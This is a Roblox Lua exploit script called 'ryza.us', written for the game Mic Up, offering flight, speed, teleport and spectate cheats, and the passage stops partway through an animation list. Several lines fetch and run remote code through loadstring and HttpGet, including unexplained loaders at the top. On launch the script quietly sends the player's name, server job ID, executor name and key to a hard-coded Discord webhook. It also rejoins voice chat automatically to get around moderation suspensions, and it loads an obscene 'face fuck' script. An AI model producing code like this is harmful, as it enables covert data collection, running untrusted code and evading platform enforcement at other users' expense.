loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/topbar.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/ownersmenu.lua"))()
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local LocalPlayer = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local UsersList = {}

table.insert(UsersList, LocalPlayer.Name)
local jsToggled = false
local fbToggled = false

local function fetchKey()
	local success, keyData = pcall(function()
		local response = game:HttpGet("https://raw.githubusercontent.com/JejcoTwiUmYQXhBpKMDl/deinemudda/refs/heads/main/key.json")
		return HttpService:JSONDecode(response)
	end)

	if success and keyData and keyData.key then
		return keyData.key
	else
		warn("Failed to fetch key data")
		return nil
	end
end

local akAdminKey = fetchKey()

local webhookURL = "https://discord.com/api/webhooks/1360363792797667439/HyzcHgo-2IahecC2GR1lYgrJ75j_boNpch1R36Q61te9SIERh8wIuKe26Ajh_rfUOg1f"
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
task.wait(0.2)
local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
local placeName = "Unknown Place"

local success, productInfo = pcall(function()
	return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)

if success and productInfo and productInfo.Name then
	placeName = productInfo.Name
end

local executorName = identifyexecutor() or "Unknown"
local executorInfo = ""

if executorName == "JJSploit x Xeno" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "JJSploit" then
	executorInfo = "HWID Spoofer"
elseif executorName == "Xeno" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "Krnl" or executorName == "KRNL" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "MacSploit" then
	executorInfo = "Safe"
elseif executorName == "Velocity" then
	executorInfo = "Unmeasured"
elseif executorName == "Swift" then
	executorInfo = "Unsafe: Slow device root cause"
else
	executorInfo = "Safety Unknown"
end

local function loadKeyFromFile()
	if readfile and isfile and isfile("ryza_KeyData.json") then
		local success, data = pcall(function()
			return HttpService:JSONDecode(readfile("ryza_KeyData.json"))
		end)
		if success and data and data.key and data.timestamp then
			return data.key
		end
	end
	return nil
end

local data = {
	content = "",
	embeds = {{
		title = "Version 2 Execution Details",
		color = 49151,
		fields = {
			{ name = "**Player Name**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
			{ name = "**Place ID**", value = "`" .. game.PlaceId .. "`", inline = true },
			{ name = "**Place Name**", value = "`" .. placeName .. "`", inline = true },
			{ name = "**Job ID**", value = "`" .. (game.JobId or "N/A") .. "`", inline = false },
			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
			{ name = "**Key Authorised**", value = (loadKeyFromFile() or "Unknown"), inline = true },
			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
		},
		footer = {
			text = "Execution Log • " .. currentTime,
			icon_url = "https://media.discordapp.net/attachments/1358006935491838104/1358007534887108638/Group_29.png?ex=67f24692&is=67f0f512&hm=ac3ac8250558a5dd7b9324f39c60d357266d0194dfba3731088c973edf9c3cc5&=&format=webp&quality=lossless&width=469&height=469"
		}
	}}
}

local jsonEncodedData = game:GetService("HttpService"):JSONEncode(data)

if httpRequest then
	pcall(function()
		httpRequest({
			Url = webhookURL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = jsonEncodedData
		})
	end)
end

local clientConfig = {
	Flying = false,
	FlyingSpeed = 50,
	BaseplateTransparency = 0
}

local uis = game:GetService("UserInputService")
local sStoreSize = UDim2.fromOffset(0, 0)

if uis.TouchEnabled then
	sStoreSize = UDim2.fromOffset(580, 300)
else
	sStoreSize = UDim2.fromOffset(580, 460)
end

local Window = Fluent:CreateWindow({
	Title = "ryza.us",
	SubTitle = "by lvasion.",
	TabWidth = 160,
	Size = sStoreSize,
	Acrylic = true,
	Theme = "Rose",
	MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
	Main = Window:AddTab({ Title = "Main", Icon = "home" }),
	Players = Window:AddTab({ Title = "Players", Icon = "users" }),
	Universals = Window:AddTab({ Title = "Universals", Icon = "umbrella" }),
	VC = Window:AddTab({ Title = "Voice Chat", Icon = "disc" }),
	Animations = Window:AddTab({ Title = "Animations", Icon = "book" }),
	Exploits = Window:AddTab({ Title = "Exploits", Icon = "hammer" }),
	Lighting = Window:AddTab({ Title = "Lighting", Icon = "sun" }),
	Exclusive = Window:AddTab({ Title = "Exclusive", Icon = "crown" }),
	Beta = Window:AddTab({ Title = "Beta", Icon = "download" }),
	Credits = Window:AddTab({ Title = "Credits", Icon = "book" }),
	Admin = Window:AddTab({ Title = "Admin", Icon = "hammer" }),
	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local Options = Fluent.Options

do	
	Fluent:Notify({
		Title = "ryza.us",
		Content = "https://discord.gg/hytt99Crdz", -- Optional
		Duration = nil -- Set to nil to make the notification not disappear
	})

	local players = game:GetService("Players")
	local replicatedStorage = game:GetService("ReplicatedStorage")
	local runService = game:GetService("RunService")

	Tabs.Main:AddParagraph({
		Title = "ryza.us",
		Content = "Welcome to ryza.us, this script was built for Mic Up.\nIf you wish to report any bugs, please join our discord server."
	})

	Tabs.Main:AddParagraph({
		Title = "Discord Server",
		Content = "Invite: https://discord.gg/Kd7ZwasrzG"
	})

	Tabs.Credits:AddParagraph({
		Title = "Script Creator",
		Content = "lvasion"
	})

	Tabs.Main:AddButton({
		Title = "Script Users",
		Description = "Check script users",
		Callback = function()
			Window:Dialog({
				Title = "Script Users",
				Content = table.concat(UsersList, ", "),
				Buttons = {
					{
						Title = "Alright!",
						Callback = function()

						end
					}
				}
			})
		end
	})

	Tabs.Main:AddButton({
		Title = "Billboard Gui's",
		Description = "Toggle billboard gui's",
		Callback = function()
			Window:Dialog({
				Title = "Billboard Gui",
				Content = "Would you like to enable or disable billboard guis?",
				Buttons = {
					{
						Title = "Enable",
						Callback = function()
							local folder = workspace:GetDescendants()

							if #folder > 0 then
								for _,v in pairs(folder) do
									if v:IsA("BillboardGui") then
										v.Enabled = true
									end
								end
							end
						end
					},
					{
						Title = "Disable",
						Callback = function()
							local folder = workspace:GetDescendants()

							if #folder > 0 then
								for _,v in pairs(folder) do
									if v:IsA("BillboardGui") then
										v.Enabled = false
									end
								end
							end
						end
					}
				}
			})
		end
	})

	Tabs.Main:AddButton({
		Title = "Kill Parts",
		Description = "Destroy kill parts",
		Callback = function()
			Window:Dialog({
				Title = "Kill Parts",
				Content = "Would you like to remove all kill parts?",
				Buttons = {
					{
						Title = "Remove",
						Callback = function()
							for _, descendant in pairs(workspace:GetDescendants()) do
								if descendant:IsA("Script") and descendant.Name == "Kill" then
									local parent = descendant.Parent
									local touchInterest = parent:FindFirstChild("TouchInterest")
									if touchInterest then
										touchInterest:Destroy()
									end
									descendant:Destroy()
								end
							end
						end
					},
					{
						Title = "Cancel",
						Callback = function()

						end
					}
				}
			})
		end
	})

	Tabs.Main:AddToggle("MyToggle", {
		Title = "Toggle Flight", 
		Description = "Toggle fly",
		Default = false,
		Callback = function(state)
			if state == true then
				clientConfig.Flying = true
				if LocalPlayer.Character then
					local rootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
					local humanoid = LocalPlayer.Character:WaitForChild("Humanoid")

					local bodyGyro = Instance.new("BodyGyro")
					bodyGyro.Parent = rootPart
					bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					bodyGyro.D = 200

					local bodyVelocity = Instance.new("BodyVelocity")
					bodyVelocity.Parent = rootPart
					bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					bodyVelocity.P = 5000
					LocalPlayer.Character.Humanoid.PlatformStand = true

					local jumpConnection
					jumpConnection = humanoid.Changed:Connect(function()
						if not clientConfig.Flying then
							jumpConnection:Disconnect()
						end
						humanoid.Jump = false
					end)

					spawn(function()
						while clientConfig.Flying do
							wait(0.05)
							local cameraCF = workspace.CurrentCamera.CFrame

							local forward = 0
							local right = 0
							local up = 0

							if UserInputService:IsKeyDown(Enum.KeyCode.W) then
								forward = 1
							elseif UserInputService:IsKeyDown(Enum.KeyCode.S) then
								forward = -1
							end

							if UserInputService:IsKeyDown(Enum.KeyCode.A) then
								right = -1
							elseif UserInputService:IsKeyDown(Enum.KeyCode.D) then
								right = 1
							end

							if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
								up = 1
							elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
								up = -1
							end

							local moveDirection = (cameraCF.LookVector * forward + cameraCF.RightVector * right + Vector3.new(0, up, 0)).Unit
							if moveDirection.Magnitude > 0 then
								bodyVelocity.Velocity = moveDirection * clientConfig.FlyingSpeed
							else
								bodyVelocity.Velocity = Vector3.new(0, 0, 0)
							end

							bodyGyro.CFrame = cameraCF
						end
					end)
				end
			elseif state == false then
				if LocalPlayer.Character then
					clientConfig.Flying = false
					local rootPart = LocalPlayer.Character:WaitForChild('HumanoidRootPart')

					if rootPart:FindFirstChild('BodyGyro') then
						rootPart.BodyGyro:Destroy()
					end
					if rootPart:FindFirstChild('BodyVelocity') then
						rootPart.BodyVelocity:Destroy()
					end

					LocalPlayer.Character.Humanoid.PlatformStand = false
				end
			end
		end 
	})

	local FlyspeedSlider = Tabs.Main:AddSlider("Slider", {
		Title = "Flight Speed",
		Description = "Set current fly speed",
		Default = 50,
		Min = 0,
		Max = 200,
		Rounding = 1,
		Callback = function(Value)
			clientConfig.FlyingSpeed = Value
		end
	})

	FlyspeedSlider:OnChanged(function(Value)
		clientConfig.FlyingSpeed = Value
	end)

	FlyspeedSlider:SetValue(50)

	Tabs.Main:AddToggle("MyToggle", {
		Title = "Baseplate", 
		Description = "Toggle extended baseplate",
		Default = false,
		Callback = function(state)
			if state == true then
				local Workspace = workspace
				local TerrainFolder = Workspace:FindFirstChild("TERRAIN_EDITOR") or Instance.new("Folder", Workspace)
				TerrainFolder.Name = "TERRAIN_EDITOR"

				local position = Vector3.new(66, -2.5, 72.5)
				local size = Vector3.new(40000, 5, 40000)
				local maxPartSize = 2048
				local material = Enum.Material.Asphalt
				local color = Color3.fromRGB(50, 50, 50)
				local transparency = 0

				local function createPart(pos, partSize)
					local part = Instance.new("Part")
					part.Size = partSize
					part.Position = pos
					part.Anchored = true
					part.Material = material
					part.Color = color
					part.Transparency = transparency
					part.Parent = TerrainFolder
					return part
				end

				if size.X > maxPartSize or size.Z > maxPartSize then
					local divisionsX = math.ceil(size.X / maxPartSize)
					local divisionsZ = math.ceil(size.Z / maxPartSize)

					local partSize = Vector3.new(size.X / divisionsX, size.Y, size.Z / divisionsZ)

					for i = 0, divisionsX - 1 do
						for j = 0, divisionsZ - 1 do
							local offsetX = (i - (divisionsX / 2)) * partSize.X + (partSize.X / 2)
							local offsetZ = (j - (divisionsZ / 2)) * partSize.Z + (partSize.Z / 2)
							createPart(position + Vector3.new(offsetX, 0, offsetZ), partSize)
						end
					end
				else
					createPart(position, size)
				end
			elseif state == false then
				local Workspace = workspace

				if Workspace:FindFirstChild("TERRAIN_EDITOR") then
					Workspace["TERRAIN_EDITOR"]:Destroy()
				end
			end
		end 
	})

	--[[Tabs.Main:AddToggle("MyToggle", {
		Title = "Flashbangs", 
		Description = "Disable admin flashbangs",
		Default = false,
		Callback = function(state)
			if state == true then
				fbToggled = true
			elseif state == false then
				fbToggled = false
			end
		end 
	})]]

	--[[Tabs.Main:AddToggle("MyToggle", {
		Title = "Jumpscares", 
		Description = "Disable admin jumpscares",
		Default = false,
		Callback = function(state)
			if state == true then
				jsToggled = true
			elseif state == false then
				jsToggled = false
			end
		end 
	})]]

	local BaseplateSlider = Tabs.Main:AddSlider("Slider", {
		Title = "Baseplate Transparency",
		Description = "Set current baseplate transparency",
		Default = 0,
		Min = 0,
		Max = 1,
		Rounding = 1,
		Callback = function(Value)
			clientConfig.BaseplateTransparency = Value

			local Workspace = workspace

			if Workspace:FindFirstChild("TERRAIN_EDITOR") then
				for _,v in pairs(Workspace["TERRAIN_EDITOR"]:GetChildren()) do
					if v:IsA("BasePart") then
						v.Transparency = clientConfig.BaseplateTransparency
					end
				end
			end
		end
	})

	BaseplateSlider:OnChanged(function(Value)
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		if char then
			clientConfig.BaseplateTransparency = Value

			local Workspace = workspace

			if Workspace:FindFirstChild("TERRAIN_EDITOR") then
				for _,v in pairs(Workspace["TERRAIN_EDITOR"]:GetChildren()) do
					if v:IsA("BasePart") then
						v.Transparency = clientConfig.BaseplateTransparency
					end
				end
			end
		end
	end)

	BaseplateSlider:SetValue(0)

	local WalkspeedSlider = Tabs.Main:AddSlider("Slider", {
		Title = "WalkSpeed",
		Description = "Set current walkspeed",
		Default = 17,
		Min = 0,
		Max = 200,
		Rounding = 1,
		Callback = function(Value)
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

			if char then
				if char:FindFirstChild("Humanoid") then
					char.Humanoid.WalkSpeed = Value
				end
			end
		end
	})

	local BaseplateColor = Tabs.Main:AddColorpicker("Colorpicker", {
		Title = "Baseplate Color",
		Description = "Set the current baseplate color",
		Default = Color3.fromRGB(50, 50, 50)
	})

	BaseplateColor:OnChanged(function()
		local Workspace = workspace

		if Workspace:FindFirstChild("TERRAIN_EDITOR") then
			for _,v in pairs(Workspace["TERRAIN_EDITOR"]:GetChildren()) do
				if v:IsA("BasePart") then
					v.Color = BaseplateColor.Value
				end
			end
		end
	end)

	BaseplateColor:SetValueRGB(Color3.fromRGB(50, 50, 50))

	WalkspeedSlider:OnChanged(function(Value)
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		if char then
			if char:FindFirstChild("Humanoid") then
				char.Humanoid.WalkSpeed = Value
			end
		end
	end)

	WalkspeedSlider:SetValue(17)

	local JumppowerSlider = Tabs.Main:AddSlider("Slider", {
		Title = "JumpPower",
		Description = "Set current jumppower",
		Default = 55,
		Min = 0,
		Max = 200,
		Rounding = 1,
		Callback = function(Value)
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

			if char then
				if char:FindFirstChild("Humanoid") then
					char.Humanoid.JumpPower = Value
					char.Humanoid.UseJumpPower = true
				end
			end
		end
	})

	-- players tab

	function getPlayer(short)
		short = string.lower(short)

		local matchedPlayer = nil

		for _, player in pairs(game:GetService("Players"):GetPlayers()) do
			if player.Name:lower():sub(1, #short) == short or player.DisplayName:lower():sub(1, #short) == short then
				matchedPlayer = player
				break
			end
		end

		return matchedPlayer
	end

	Tabs.Players:AddParagraph({
		Title = "Server Player",
		Content = "Ensure when inputting, you either input a username or displayname.\nNote: You do not require the full username."
	})

	local SpectateInput = Tabs.Players:AddInput("Input", {
		Title = "Spectate",
		Default = "",
		Placeholder = "Player",
		Numeric = false, -- Only allows numbers
		Finished = true, -- Only calls callback when you press enter
		Callback = function(Value)
			local player = getPlayer(Value)

			if player then
				local currentCamera = game.Workspace.CurrentCamera
				currentCamera.CameraSubject = player.Character:FindFirstChild("Humanoid")
				currentCamera.CameraType = Enum.CameraType.Follow
			end
		end
	})

	local _market = game:GetService("MarketplaceService")

	Tabs.Players:AddButton({
		Title = "Spectating",
		Description = "Stop specting a player",
		Callback = function()
			Window:Dialog({
				Title = "Stop Spectating",
				Content = "Would you like to stop spectating this user?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							local currentCamera = game.Workspace.CurrentCamera
							currentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
							currentCamera.CameraType = Enum.CameraType.Follow
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	local TeleportInput = Tabs.Players:AddInput("Input", {
		Title = "Teleport",
		Default = "",
		Placeholder = "Player",
		Numeric = false, -- Only allows numbers
		Finished = true, -- Only calls callback when you press enter
		Callback = function(Value)
			local player = getPlayer(Value)

			if player and player.Character then
				if LocalPlayer.Character then
					LocalPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
				end
			end
		end
	})

	-- universals tab

	Tabs.Universals:AddButton({
		Title = "Infinite Yield",
		Description = "Execute Infinite Yield",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject infinite yield?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/ZLens/RobloxExperience/refs/heads/main/infinite%20yield.lua", true))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "AK Admin",
		Description = "Key: " .. akAdminKey,
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject ak admin?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLkeeptrying/AKADMIN/main/Congratslol"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "System Broken",
		Description = "Execute System Broken",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject system broken?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Face Fuck",
		Description = "Execute Face Fuck (Z)",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject face fuck?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/bruhlolw/refs/heads/main/face_bang_script.lua'))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Reanimations",
		Description = "Execute Reanimations",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject reanimations?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet('https://raw.githubusercontent.com/ZLens/RobloxExperience/refs/heads/main/reanimations.lua'))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Rewind",
		Description = "Execute Rewind (Hold C)",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject rewind?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/platinum-ViniVX/mic-up-script-pack/refs/heads/main/rewind%20script"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Emotes GUI",
		Description = "Execute Emotes GUI (Comma)",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject emotes gui?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/ZLens/RobloxExperience/refs/heads/main/emotegui.lua"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Large Emotes GUI",
		Description = "Execute Emotes GUI (Comma)",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject emotes gui?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/ZLens/robmain/refs/heads/main/biggeremotesgui.lua"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Universals:AddButton({
		Title = "Copy Animations",
		Description = "Execute copy animations",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject copy animations?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/ZLens/robmain/refs/heads/main/copyanims.lua"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})


	Tabs.Universals:AddButton({
		Title = "Empty Tools",
		Description = "Execute Empty Tools",
		Callback = function()
			Window:Dialog({
				Title = "Execution",
				Content = "Would you like to inject empty tools gui?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							loadstring(game:HttpGet("https://raw.githubusercontent.com/ZLens/RobloxExperience/refs/heads/main/emptytools.lua"))()
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	-- voice chat tab

	Tabs.VC:AddButton({
		Title = "Reconnect",
		Description = "Connect to voice chat",
		Callback = function()
			local _vc = game:GetService("VoiceChatService")
			_vc:joinVoice()
		end
	})

	Tabs.VC:AddButton({
		Title = "Disconnect",
		Description = "Disconnect from voice chat",
		Callback = function()
			local _vc = game:GetService("VoiceChatInternal")
			_vc:Leave()
		end
	})

	local function removeSuspension()
		task.wait(3)
		local _vc = game:GetService("VoiceChatService")
		_vc:joinVoice()
		task.wait(0.5)
	end

	game:GetService("VoiceChatInternal").LocalPlayerModerated:Connect(removeSuspension)

	Fluent:Notify({
		Title = "Voice Chat",
		Content = "We have loaded voice chat internal, you will no longer get suspended.",
		Duration = 5
	})

	-- animations tab

	local AnimationIdInput = Tabs.Animations:AddInput("Input", {
		Title = "Play animationId",
		Default = "",
		Placeholder = "Animation Id",
		Numeric = true, -- Only allows numbers
		Finished = true, -- Only calls callback when you press enter
		Callback = function(Value)
			local succ, err = pcall(function()
				LocalPlayer.Character.Humanoid:PlayEmoteAndGetAnimTrackById(tonumber(Value))
			end)

			if succ then
				LocalPlayer.Character.Humanoid:PlayEmoteAndGetAnimTrackById(tonumber(Value))
			else
				Fluent:Notify({
					Title = "Script Error",
					Content = "Failed to load animation, " .. err .. ".",
					Duration = 5
				})
				return 
			end
		end
	})

	local Animations = {
		{"Salute", "http://www.roblox.com/asset/?id=10714389988"},
		{"Applaud", "http://www.roblox.com/asset/?id=10713966026"},
		{"Tilt", "http://www.roblox.com/asset/?id=10714338461"},
		{"Baby Queen - Bouncy Twirl", "http://www.roblox.com/asset/?id=14352343065"},
		{"Yungblud Happier Jump", "http://www.roblox.com/asset/?id=15609995579"},
		{"Baby Queen - Face Frame", "http://www.roblox.com/asset/?id=14352340648"},
		{"Baby Queen - Strut", "http://www.roblox.com/asset/?id=14352362059"},
		{"KATSEYE - Touch", "http://www.roblox.com/asset/?id=135876612109535"},
		{"Secret Handshake Dance", "http://www.roblox.com/asset/?id=71243990877913"},
		{"Godlike", "http://www.roblox.com/asset/?id=10714347256"},
		{"Mae Stephens - Piano Hands", "http://www.roblox.com/asset/?id=16553163212"},
		{"Alo Yoga Pose - Lotus Position", "http://www.roblox.com/asset/?id=12507085924"},
		{"d4vd - Backflip", "http://www.roblox.com/asset/?id=15693621070"},
		{"Bored", "http://www.roblox.com/asset/?id=10713992055"},
		{"Cuco - Levitate", "http://www.roblox.com/asset/?id=15698404340"},
		{"Hero Landing", "http://www.roblox.com/asset/?id=10714360164"},
		{"Sleep", "http://www.roblox.com/asset/?id=10714360343"},
		{"Shrug", "http://www.roblox.com/asset/?id=10714374484"},
		{"Shy", "http://www.roblox.com/asset/?id=10714369325"},
		{"Festive Dance", "http://www.roblox.com/asset/?id=15679621440"},
		{"V Pose - Tommy Hilfiger", "http://www.roblox.com/asset/?id=10214319518"},
		{"Olivia Rodrigo Head Bop", "http://www.roblox.com/asset/?id=15517864808"},
		{"Elton John - Heart Shuffle", "http://www.roblox.com/asset/?id=17748314784"},
		{"Bone Chillin Bop", "http://www.roblox.com/asset/?id=15122972413"},
		{"Curtsy", "http://www.roblox.com/asset/?id=10714061912"},
		{"Floss Dance", "http://www.roblox.com/asset/?id=10714340543"},
		{"Hello", "http://www.roblox.com/asset/?id=10714359093"},
		{"Victory Dance", "http://www.roblox.com/asset/?id=15505456446"},
		{"Monkey", "http://www.roblox.com/asset/?id=10714388352"},
		{"TWICE Feel Special", "http://www.roblox.com/asset/?id=14899980745"},
		{"Point2", "http://www.roblox.com/asset/?id=10714395441"},
		{"Quiet Waves", "http://www.roblox.com/asset/?id=10714390497"},
		{"HIPMOTION - Amaarae", "http://www.roblox.com/asset/?id=16572740012"},
		{"Frosty Flair - Tommy Hilfiger", "http://www.roblox.com/asset/?id=10214311282"},
		{"Chappell Roan HOT TO GO!", "http://www.roblox.com/asset/?id=85267023718407"},
		{"Stadium", "http://www.roblox.com/asset/?id=10714356920"},
		{"Skibidi Toilet - Titan Speakerman Laser Spin", "http://www.roblox.com/asset/?id=134283166482394"},
		{"Sad", "http://www.roblox.com/asset/?id=10714392876"},
		{"Greatest", "http://www.roblox.com/asset/?id=10714349037"},
		{"Sturdy Dance - Ice Spice", "http://www.roblox.com/asset/?id=17746180844"},
		{"Elton John - Heart Skip", "http://www.roblox.com/asset/?id=11309255148"},
		{"Paris Hilton - Iconic IT-Grrrl", "http://www.roblox.com/asset/?id=15392756794"},
		{"Fashion Roadkill", "http://www.roblox.com/asset/?id=136831243854748"},
		{"Nicki Minaj Starships", "http://www.roblox.com/asset/?id=15571453761"},
		{"TWICE LIKEY", "http://www.roblox.com/asset/?id=14899979575"},
		{"Nicki Minaj Boom Boom Boom", "http://www.roblox.com/asset/?id=15571448688"},
		{"Sol de Janeiro - Samba", "http://www.roblox.com/asset/?id=16270690701"},
		{"HUGO Lets Drive!", "http://www.roblox.com/asset/?id=17360699557"},
		{"Paris Hilton - Sliving For The Groove", "http://www.roblox.com/asset/?id=15392759696"},
		{"Tommy - Archer", "http://www.roblox.com/asset/?id=13823324057"},
		{"Beauty Touchdown", "http://www.roblox.com/asset/?id=16302968986"},
		{"Cower", "http://www.roblox.com/asset/?id=4940563117"},
		{"Happy", "http://www.roblox.com/asset/?id=10714352626"},
		{"Flex Walk", "http://www.roblox.com/asset/?id=15505459811"},
		{"Team USA Breaking Emote", "http://www.roblox.com/asset/?id=18526288497"},
		{"Zombie", "http://www.roblox.com/asset/?id=10714089137"},
		{"Olivia Rodrigo Fall Back to Float", "http://www.roblox.com/asset/?id=15549124879"},
		{"Stray Kids Walkin On Water", "http://www.roblox.com/asset/?id=125064469983655"},
		{"Haha", "http://www.roblox.com/asset/?id=10714350889"},
		{"Baby Queen - Air Guitar & Knee Slide", "http://www.roblox.com/asset/?id=14352335202"},
		{"Dizzy", "http://www.roblox.com/asset/?id=10714066964"},
		{"High Wave", "http://www.roblox.com/asset/?id=10714362852"},
		{"Beckon", "http://www.roblox.com/asset/?id=10713984554"},
		{"Show Dem Wrists - KSI", "http://www.roblox.com/asset/?id=10714377090"},
		{"Jumping Wave", "http://www.roblox.com/asset/?id=10714378156"},
		{"Baby Queen - Dramatic Bow", "http://www.roblox.com/asset/?id=14352337694"},
		{"Fast Hands", "http://www.roblox.com/asset/?id=10714100539"},
		{"Dolphin Dance", "http://www.roblox.com/asset/?id=10714068222"},
		{"Wake Up Call - KSI", "http://www.roblox.com/asset/?id=10714168145"},
		{"Jawny - Stomp", "http://www.roblox.com/asset/?id=16392075853"},
		{"Elton John - Rock Out", "http://www.roblox.com/asset/?id=11753474067"},
		{"Paris Hilton - Checking My Angles", "http://www.roblox.com/asset/?id=15392752812"},
		{"Power Blast", "http://www.roblox.com/asset/?id=10714389396"},
		{"Bodybuilder", "http://www.roblox.com/asset/?id=10713990381"},
		{"Line Dance", "http://www.roblox.com/asset/?id=10714383856"},
		{"Rock n Roll", "http://www.roblox.com/asset/?id=15505458452"},
		{"Agree", "http://www.roblox.com/asset/?id=10713954623"},
		{"Celebrate", "http://www.roblox.com/asset/?id=10714016223"},
		{"Mini Kong", "http://www.roblox.com/asset/?id=17000021306"},
		{"TMNT Dance", "http://www.roblox.com/asset/?id=18665811005"},
		{"ALTÉGO - Couldn’t Care Less", "http://www.roblox.com/asset/?id=107875941017127"},
		{"Rolling Stones Guitar Strum", "http://www.roblox.com/asset/?id=18148804340"},
		{"Rock Out - Bebe Rexha", "http://www.roblox.com/asset/?id=18225053113"},
		{"ericdoa - dance", "http://www.roblox.com/asset/?id=15698402762"},
		{"Confused", "http://www.roblox.com/asset/?id=4940561610"},
		{"Ay-Yo Dance Move - NCT 127", "http://www.roblox.com/asset/?id=12804157977"},
		{"Rock On", "http://www.roblox.com/asset/?id=10714403700"},
		{"Imagine Dragons - “Bones” Dance", "http://www.roblox.com/asset/?id=15689279687"},
		{"Mae Stephens – Arm Wave", "http://www.roblox.com/asset/?id=16584481352"},
		{"Uprise - Tommy Hilfiger", "http://www.roblox.com/asset/?id=10275008655"},
		{"Sidekicks - George Ezra", "http://www.roblox.com/asset/?id=10370362157"},
		{"Boxing Punch - KSI", "http://www.roblox.com/asset/?id=10717116749"},
		{"Fashionable", "http://www.roblox.com/asset/?id=10714091938"},
		{"Paris Hilton Sanasa", "http://www.roblox.com/asset/?id=16126469463"},
